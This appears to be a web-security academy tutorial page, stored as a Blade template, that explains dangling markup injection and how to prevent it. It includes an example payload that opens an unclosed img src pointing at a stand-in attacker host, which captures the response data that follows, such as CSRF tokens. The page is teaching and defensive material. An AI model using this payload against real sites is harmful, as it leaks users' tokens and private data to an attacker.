@extends('layouts.academy')

@section('title', 'Dangling markup injection | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="16">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>Cross-site scripting (XSS)</h3>
        <ul>
            <li><a href="/web-security/cross-site-scripting#what-is-cross-site-scripting-xss">What is XSS?</a></li>
            <li><a href="/web-security/cross-site-scripting#how-does-xss-work">How does XSS work?</a></li>
            <li><a href="/web-security/cross-site-scripting#impact-of-xss-vulnerabilities">Impact of an attack</a></li>
            <li><a href="/web-security/cross-site-scripting#xss-proof-of-concept">Proof of concept</a></li>
            <li><a href="/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities">Testing</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-1">
                <label for="sub-nav-id-1">
                    <a href="/web-security/cross-site-scripting/reflected">Reflected XSS</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks">Impact</a></li>
                    <li><a href="/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts">Contexts</a></li>
                    <li><a href="/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities">Testing</a></li>
                    <li><a href="/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting">FAQs</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/cross-site-scripting/stored">Stored XSS</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks">Impact</a></li>
                    <li><a href="/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts">Contexts</a></li>
                    <li><a href="/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities">Testing for vulnerabilities</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/cross-site-scripting/dom-based">DOM-based XSS</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li>
                        <input type="checkbox" id="sub-nav-id-4">
                        <label for="sub-nav-id-4">
                            <a href="/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting">Testing</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/cross-site-scripting/dom-based#testing-html-sinks">HTML sinks</a></li>
                            <li><a href="/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks">JavaScript execution sinks</a></li>
                            <li><a href="/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader">Using DOM Invader</a></li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-5">
                        <label for="sub-nav-id-5">
                            <a href="/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks">Exploiting</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li>
                                <input type="checkbox" id="sub-nav-id-6">
                                <label for="sub-nav-id-6">
                                    <a href="/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies">In third-party dependencies</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery">jQuery</a></li>
                                    <li><a href="/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs">AngularJS</a></li>
                                </ul>
                            </li>
                            <li><a href="/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data">DOM
                                XSS combined with reflected and stored data</a></li>
                            <li><a href="/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">Sinks</a></li>
                            <li><a href="/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities">Preventing</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-7">
                <label for="sub-nav-id-7">
                    <a href="/web-security/cross-site-scripting/contexts">XSS contexts</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/contexts#xss-between-html-tags">Between HTML tags</a></li>
                    <li><a href="/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes">In HTML tag attributes</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-8">
                        <label for="sub-nav-id-8">
                            <a href="/web-security/cross-site-scripting/contexts#xss-into-javascript">JavaScript</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/cross-site-scripting/contexts#terminating-the-existing-script">Terminating the existing script</a></li>
                            <li><a href="/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string">Breaking out of a string</a></li>
                            <li><a href="/web-security/cross-site-scripting/contexts#making-use-of-html-encoding">Using HTML-encoding</a></li>
                            <li><a href="/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals">Template literals</a></li>
                        </ul>
                    </li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-9">
                        <label for="sub-nav-id-9">
                            <a href="/web-security/cross-site-scripting/contexts/client-side-template-injection">Client-side template injection</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox">AngularJS sandbox</a></li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-10">
                                <label for="sub-nav-id-10">
                                    <a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work">AngularJS sandbox escape</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape">Constructing an advanced escape</a></li>
                                </ul>
                            </li>
                            <li>
                                <input type="checkbox" id="sub-nav-id-11">
                                <label for="sub-nav-id-11">
                                    <a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work">AngularJS CSP bypass</a>
                                    <span class="icon-arrow-head-down"></span>
                                </label>
                                <ul>
                                    <li><a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape">Bypassing a CSP with an AngularJS sandbox escape</a></li>
                                </ul>
                            </li>
                            <li><a href="/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities">Preventing</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-12">
                <label for="sub-nav-id-12">
                    <a href="/web-security/cross-site-scripting/exploiting">Exploiting XSS vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies">To steal cookies</a></li>
                    <li><a href="/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords">To capture passwords</a></li>
                    <li><a href="/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-bypass-csrf-protections">To perform CSRF</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-13">
                <label for="sub-nav-id-13">
                    <a href="/web-security/cross-site-scripting/dangling-markup">Dangling markup injection</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks">Preventing attacks</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-14">
                <label for="sub-nav-id-14">
                    <a href="/web-security/cross-site-scripting/content-security-policy">Content security policy (CSP)</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp">Mitigating XSS attacks</a></li>
                    <li><a href="/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp">Mitigating dangling markup attacks</a></li>
                    <li><a href="/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection">Bypassing CSP</a></li>
                    <li><a href="/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp">Protecting against clickjacking</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-15">
                <label for="sub-nav-id-15">
                    <a href="/web-security/cross-site-scripting/preventing">Preventing XSS attacks</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cross-site-scripting/preventing#encode-data-on-output">Encode data on output</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-16">
                        <label for="sub-nav-id-16">
                            <a href="/web-security/cross-site-scripting/preventing#validate-input-on-arrival">Validate input on arrival</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting">Whitelisting vs blacklisting</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/cross-site-scripting/preventing#allowing-safe-html">Allowing "safe" HTML</a></li>
                    <li><a href="/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine">Using a template engine</a></li>
                    <li><a href="/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php">In PHP</a></li>
                    <li><a href="/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript">In JavaScript</a></li>
                    <li><a href="/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery">In jQuery</a></li>
                    <li><a href="/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp">Using CSP</a></li>
                </ul>
            </li>
            <li><a href="/web-security/cross-site-scripting/cheat-sheet">Cheat sheet</a></li>
            <li><a href="/web-security/all-labs#cross-site-scripting">View all XSS labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/cross-site-scripting"><span itemprop="name">Cross-site scripting</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/cross-site-scripting/dangling-markup"><span itemprop="name">Dangling markup</span></a><meta itemprop="position" content="3" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2">Dangling markup injection</h1><p>
            In this section, we'll explain dangling markup injection, how a typical exploit works, and how to prevent dangling markup attacks.
        </p><h2 id="what-is-dangling-markup-injection">What is dangling markup injection?</h2><p>
            Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
        </p><p>
            Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
        </p><code class="code-scrollable">&lt;input type="text" name="input" value="CONTROLLABLE DATA HERE</code><p>
            Suppose also that the application does not filter or escape the <code>&gt;</code> or <code>&quot;</code> characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:
        </p><code class="code-scrollable">&quot;&gt;</code><p>
            In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
        </p><code class="code-scrollable">&quot;&gt;&lt;img src='//attacker-website.com?</code><p>
            This payload creates an <code>img</code> tag and defines the start of a <code>src</code> attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the <code>src</code> attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
        </p><p>
            The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
        </p><p>
            Any attribute that makes an external request can be used for dangling markup.
        </p><p>
			This next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it from an external server later. Solving this lab might require user interaction.
		</p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '417F3BDBF234C3C15104E0712F05C5F080950E7ECC18C37B7FDAFDE0149BE0EB'])@verbatim<h2 id="how-to-prevent-dangling-markup-attacks">How to prevent dangling markup attacks</h2><p>
            You can prevent dangling markup attacks using the same general defenses for <a href="/web-security/cross-site-scripting/preventing">preventing cross-site scripting</a>, by encoding data on output and validating input on arrival.
        </p><p>
            You can also mitigate some dangling markup attacks using <a href="/web-security/cross-site-scripting/content-security-policy">content security policy</a> (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like <code>img</code> from loading external resources.
        </p><div class="highlightedarea"> 
     <h4>Note</h4> 
        <p>
            The Chrome browser has decided to tackle dangling markup attacks by preventing tags like <code>img</code> from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.
        </p>
    </div>
        
        @endverbatim@include('partials.widget', ['id' => 'academy-registration-footer'])@verbatim
    
    </div>


    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
